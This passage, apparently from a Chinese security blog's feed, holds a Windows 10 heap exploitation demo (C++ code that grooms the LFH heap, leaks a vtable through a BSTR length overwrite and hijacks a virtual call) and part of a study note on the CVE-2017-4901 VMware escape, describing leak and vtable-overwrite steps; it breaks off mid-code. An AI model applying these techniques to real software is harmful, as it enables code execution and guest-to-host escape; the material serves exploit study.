title="由上述知识，先写一个泄露地址的demo"></a>由上述知识，先写一个泄露地址的demo</h3><p>来一套pwn手的习惯操作：</p><ol><li>分配连续的未由LFH处理过的块。</li><li>释放中间某个，留下个hole。</li><li>在hole上分配某个可控大小的对象，通常是应用程序里适合的好用的对象，一个优秀的选择是BSTR。</li><li>然后释放3中对象的下一个内存块，产生hole2。</li><li>把要泄露的指针保存到数组里，把数组分配到hole2。</li><li>（通过溢出之类的）通过3读5中的对象，泄露。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x190</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">LPVOID chunk[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooObject</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    FooObject() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~FooObject() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    BSTR bstr;</span><br><span class="line">    FooObject *fooObject = <span class="keyword">new</span> FooObject();</span><br><span class="line"></span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        chunk[i] = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%2d] alloc chunk at 0x%08x\n"</span>, i, chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">5</span>, chunk[<span class="number">5</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    bstr = SysAllocString(<span class="string">L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string : 0x%08x\n"</span>, bstr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">6</span>, chunk[<span class="number">6</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_foo_object = (<span class="keyword">int</span>)fooObject;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Foo Object at 0x%08x\n"</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array0(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array1(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array2(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array3(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array4(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array5(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array6(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array7(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array8(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array9(<span class="number">40</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string[-2] : %d\n"</span>, bstr[<span class="number">-2</span>]);</span><br><span class="line">    bstr[<span class="number">-2</span>] = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> vtable = bstr[<span class="number">131</span>] &lt;&lt; <span class="number">16</span> | bstr[<span class="number">130</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable addr 0x%08x\n"</span>, vtable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[ 0] alloc chunk at 0x00a20968</span><br><span class="line">[ 1] alloc chunk at 0x00a27d38</span><br><span class="line">[ 2] alloc chunk at 0x00a27ed0</span><br><span class="line">[ 3] alloc chunk at 0x00a28068</span><br><span class="line">[ 4] alloc chunk at 0x00a28200</span><br><span class="line">[ 5] alloc chunk at 0x00a28398</span><br><span class="line">[ 6] alloc chunk at 0x00a28530</span><br><span class="line">[ 7] alloc chunk at 0x00a286c8</span><br><span class="line">[ 8] alloc chunk at 0x00a28860</span><br><span class="line">[ 9] alloc chunk at 0x00a289f8</span><br><span class="line">[10] alloc chunk at 0x00a28b90</span><br><span class="line">[11] alloc chunk at 0x00a28d28</span><br><span class="line">[12] alloc chunk at 0x00a24d08</span><br><span class="line">[13] alloc chunk at 0x00a24ea0</span><br><span class="line">[14] alloc chunk at 0x00a25038</span><br><span class="line">[15] alloc chunk at 0x00a251d0</span><br><span class="line">[16] alloc chunk at 0x00a25368</span><br><span class="line">[17] alloc chunk at 0x00a29878</span><br><span class="line">[5] free chunk at 0x00a28398</span><br><span class="line">BSTR string : 0x00a2839c</span><br><span class="line">[6] free chunk at 0x00a28530</span><br><span class="line">Foo Object at 0x00a12d50</span><br><span class="line">BSTR string[-2] : 248</span><br><span class="line">vtable addr 0x00a12d50</span><br></pre></td></tr></table></figure><p>可以看到成功输出了vtable。</p><h3 id="信息泄露之后，任意代码执行"><a href="#信息泄露之后，任意代码执行" class="headerlink" title="信息泄露之后，任意代码执行"></a>信息泄露之后，任意代码执行</h3><p>通过以上操作我们已经可以任意地址读了，再结合这个溢出的任意地址写，就可以改vtable来任意代码执行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x190</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">LPVOID chunk[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooObject</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    FooObject() &#123;&#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~FooObject() &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Destructor!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"shell!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    BSTR bstr;</span><br><span class="line">    FooObject* fooObject = <span class="keyword">new</span> FooObject();</span><br><span class="line"></span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        chunk[i] = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="comment">// printf("[%2d] alloc chunk at 0x%08x\n", i, chunk[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">5</span>, chunk[<span class="number">5</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    bstr = SysAllocString(<span class="string">L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string : 0x%08x\n"</span>, bstr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] free chunk at 0x%08x\n"</span>, <span class="number">6</span>, chunk[<span class="number">6</span>]);</span><br><span class="line">    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk[<span class="number">6</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_foo_object = (<span class="keyword">int</span>)fooObject;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Foo Object at 0x%08x\n"</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array0(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array1(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array2(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array3(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array4(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array5(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array6(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array7(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array8(<span class="number">40</span>, addr_foo_object);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; array9(<span class="number">40</span>, addr_foo_object);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"BSTR string[-2] : %d\n"</span>, bstr[<span class="number">-2</span>]);</span><br><span class="line">    bstr[<span class="number">-2</span>] = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> vtable_addr = bstr[<span class="number">131</span>] &lt;&lt; <span class="number">16</span> | bstr[<span class="number">130</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable addr : 0x%08x\n"</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> vtable = *(<span class="keyword">int</span> *)vtable_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vtable : 0x%08x\n"</span>, vtable);</span><br><span class="line"></span><br><span class="line">    DWORD dwOld = <span class="number">0</span>;</span><br><span class="line">    VirtualProtect((<span class="keyword">void</span> *)vtable, <span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line">    (*(<span class="keyword">int</span>*)vtable) = (<span class="keyword">int</span>)shell;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fooObject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到执行结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[5] free chunk at 0x007810c0</span><br><span class="line">BSTR string : 0x007810c4</span><br><span class="line">[6] free chunk at 0x00781258</span><br><span class="line">Foo Object at 0x007732c0</span><br><span class="line">BSTR string[-2] : 248</span><br><span class="line">vtable addr : 0x007732c0</span><br><span class="line">vtable : 0x00b63318</span><br><span class="line">shell!</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然这只是打个样，实际情况要复杂的多，要利用读写原语修改页属性，然后改虚表执行代码，当然虚表也可能改崩，随鸡应变。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Win10堆分配背景知识&quot;&gt;&lt;a href=&quot;#Win10堆分配背景知识&quot; class=&quot;headerlink&quot; title=&quot;Win10堆分配背景知识&quot;&gt;&lt;/a&gt;Win10堆分配背景知识&lt;/h2&gt;&lt;p&gt;Windows不像Linux，有开源代码可以读，微软至今都没
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Base" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Base/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Base" scheme="https://github.com/Cracke-S-J/tags/Base/"/>
    
  </entry>
  
  <entry>
    <title>VM 逃逸入门学习</title>
    <link href="https://github.com/Cracke-S-J/2020/05/09/vm%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"/>
    <id>https://github.com/Cracke-S-J/2020/05/09/vm%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/</id>
    <published>2020-05-09T11:08:53.000Z</published>
    <updated>2020-06-07T10:35:26.088Z</updated>
    
    <content type="html"><![CDATA[<p>继Linux内核、浏览器、文档型漏洞，虚拟机应该是最后一块了，（从目前我入门二进制漏洞实战来看。主要是针对VM Ware和Virtual Box。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="在此整理任意读写原语的获取技巧"><a href="#在此整理任意读写原语的获取技巧" class="headerlink" title="在此整理任意读写原语的获取技巧"></a>在此整理任意读写原语的获取技巧</h3><h4 id="读原语"><a href="#读原语" class="headerlink" title="读原语"></a>读原语</h4><p>找一些有读操作的结构，可以通过漏洞利用覆盖字符串结尾\x00读相邻内容，这种一般不能直接任意地址地址泄露，但是可以通过布局内存，泄露出想要的地址。</p><p>任意地址读基本就是修改数组的长度了。</p><p>类型混淆也可以达到读效果，比如把指针当做字符串解析，可以泄露这个指针。</p><h4 id="写原语"><a href="#写原语" class="headerlink" title="写原语"></a>写原语</h4><p>任意地址写可以先用漏洞点修改某个对象的长度，然后用这个对象去覆盖相邻有写操作的对象，达到任意地址写。</p><h4 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h4><p>shellcode起码要放在rwx的内存页中，要么就是gadgets。</p><p>执行的话，可以任意地址写去修改函数指针、虚表；也可以类型混淆，比如把字符串解析成指针，就可以执行了（注意dep）。</p><h2 id="CVE-2017-4901-利用一个堆溢出漏洞实现-VMware-虚拟机逃逸"><a href="#CVE-2017-4901-利用一个堆溢出漏洞实现-VMware-虚拟机逃逸" class="headerlink" title="CVE-2017-4901 利用一个堆溢出漏洞实现 VMware 虚拟机逃逸"></a>CVE-2017-4901 利用一个堆溢出漏洞实现 VMware 虚拟机逃逸</h2><p><a href="https://paper.seebug.org/348/" target="_blank" rel="noopener">https://paper.seebug.org/348/</a></p><h3 id="VMware-RPCI-机制"><a href="#VMware-RPCI-机制" class="headerlink" title="VMware RPCI 机制"></a>VMware RPCI 机制</h3><p>用这个与host实现通信看下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>  </span><br><span class="line">Backdoor_InOut(Backdoor_proto *myBp) <span class="comment">// IN/OUT  </span></span><br><span class="line">&#123;</span><br><span class="line">   uint64 dummy;</span><br><span class="line"></span><br><span class="line">   __asm__ __volatile__(</span><br><span class="line">#ifdef __APPLE__</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Save %rbx on the stack because the Mac OS GCC doesn't want us to</span></span><br><span class="line"><span class="comment">         * clobber it - it erroneously thinks %rbx is the PIC register.</span></span><br><span class="line"><span class="comment">         * (Radar bug 7304232)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"pushq %%rbx"</span>           <span class="string">"\n\t"</span></span><br><span class="line">#endif</span><br><span class="line">        <span class="string">"pushq %%rax"</span>           <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 40(%%rax), %%rdi"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 32(%%rax), %%rsi"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 24(%%rax), %%rdx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq 16(%%rax), %%rcx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq  8(%%rax), %%rbx"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq   (%%rax), %%rax"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"inl %%dx, %%eax"</span>       <span class="string">"\n\t"</span>  <span class="comment">/* NB: There is no inq instruction */</span></span><br><span class="line">        <span class="string">"xchgq %%rax, (%%rsp)"</span>  <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rdi, 40(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rsi, 32(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rdx, 24(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rcx, 16(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"movq %%rbx,  8(%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">        <span class="string">"popq          (%%rax)"</span> <span class="string">"\n\t"</span></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line">        <span class="string">"popq %%rbx"</span>            <span class="string">"\n\t"</span></span><br><span class="line">#endif</span><br><span class="line">      : <span class="string">"=a"</span> (dummy)</span><br><span class="line">      : <span class="string">"0"</span> (myBp)</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * vmware can modify the whole VM state without the compiler knowing</span></span><br><span class="line"><span class="comment">       * it. So far it does not modify EFLAGS. --hpreg</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      :</span><br><span class="line">#ifndef __APPLE__</span><br><span class="line">      <span class="comment">/* %rbx is unchanged at the end of the function on Mac OS. */</span></span><br><span class="line">      <span class="string">"rbx"</span>,</span><br><span class="line">#endif</span><br><span class="line">      <span class="string">"rcx"</span>, <span class="string">"rdx"</span>, <span class="string">"rsi"</span>, <span class="string">"rdi"</span>, <span class="string">"memory"</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>inl</code>这个指令，guest是不允许io操作的，它发起io操作，host会产生异常，异常会被捕捉，从而实现通信。</p><h3 id="漏洞点-拖放-DnD-与复制粘贴-CP"><a href="#漏洞点-拖放-DnD-与复制粘贴-CP" class="headerlink" title="漏洞点 拖放(DnD)与复制粘贴(CP)"></a>漏洞点 拖放(DnD)与复制粘贴(CP)</h3><p>对于Version 4的DnD/CP功能，它检查是否越界的时候，只对第一个包有效，后续的包可能越界产生堆溢出。Version 3也是一样的。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>要注意的是，因为有这个溢出，我们已经可以任意地址写了，所以要做的是进行信息泄露，找到要攻击对象的位置，然后决定怎么覆盖个啥。</p><h4 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h4><p>需要找一guest可以写并且取回的操作，找到了如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info-set guestinfo.KEY VALUE</span><br><span class="line">info-get guestinfo.KEY</span><br></pre></td></tr></table></figure><p>我们可以通过溢出来覆盖结尾的null字节，让字符串连接上相邻的内存块。如果我们能够在发生溢出的内存块和DnD或CP对象之间分配一个字符串，那么我们就能泄露对象的vtable地址，从而我们就可以知道vmware-vmx的地址。</p><p>分配一堆字符串，利用溢出改字符，找出被改那个字符串，这样就找到了一个字符串可以被用来读取泄露的数据，然后以0xA8的粒度继续溢出，不断地读，由于DnD和CP对象的vtable距离vmware-vmx基地址的偏移是固定的，只需要检查最低一些数据位，就能够判断溢出是否到达了目标对象。</p><p>此时我们有了目标对象位置。</p><h4 id="覆盖-CopyPaste"><a href="#覆盖-CopyPaste" class="headerlink" title="覆盖 CopyPaste"></a>覆盖 CopyPaste</h4><p>这是要覆盖虚表指针为指向shellcode的恶意函数指针。</p><p>对于 CopyPaste 对象，我们可以覆盖虚表指针，让它指向我们可控的其他数据。我们需要找到一个指针，指针指向的数据是可控并被用做对象的虚表。为此我们使用了另一个 RPCI 命令 unity.window.contents.start。这个命令主要用于 Unity 模式下，在 host 上绘制一些图像。这个操作可以让我们往相对 vmware-vmx 偏移已知的位置写入一些数据。该命令接收的参数是图像的宽度和高度，二者都是32位，合并起来我们就在已知位置获得了一个64位的数据。我们用它来作为虚表中的一个指针，通过发送一个 CopyPast 命令即可触发该虚函数调用，步骤如下：</p><ul><li>发送 unity.window.contents.start 命令，通过指定参数宽度和高度，往全局变量处写入一个64位的栈迁移 gadget 地址</li><li>覆盖对象虚表指针，指向伪造的虚表（调整虚表地址偏移）</li><li>发送 CopyPaste 命令，触发虚函数调用</li><li>ROP</li></ul><h4 id="覆盖-DnD"><a href="#覆盖-DnD" class="headerlink" title="覆盖 DnD"></a>覆盖 DnD</h4><p>先康一眼结构：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DnD_CopyPaste_RpcV3&#123;  </span><br><span class="line">    <span class="keyword">void</span> * vtable;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">uint64_t</span> ifacetype;</span><br><span class="line">    